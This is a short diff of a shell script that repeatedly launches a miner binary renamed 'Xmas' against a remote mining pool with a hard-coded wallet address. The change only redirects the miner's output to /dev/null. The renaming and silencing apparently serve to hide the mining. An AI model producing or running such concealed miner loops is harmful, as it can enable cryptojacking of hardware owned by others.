@@ -102,6 +102,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10126 -a panthera -u solo:Svm2UGu7wbSSFQkAmttze1ZWceASny1VE9dnx59Lx5coHX5sAFEXmEVGfVE7BFAyd2VrTxHtzn5zYfjjxRmwnNBi3BHw9RQay@$provider --rig-id=$provider -p x -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10126 -a panthera -u solo:Svm2UGu7wbSSFQkAmttze1ZWceASny1VE9dnx59Lx5coHX5sAFEXmEVGfVE7BFAyd2VrTxHtzn5zYfjjxRmwnNBi3BHw9RQay@$provider --rig-id=$provider -p x -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
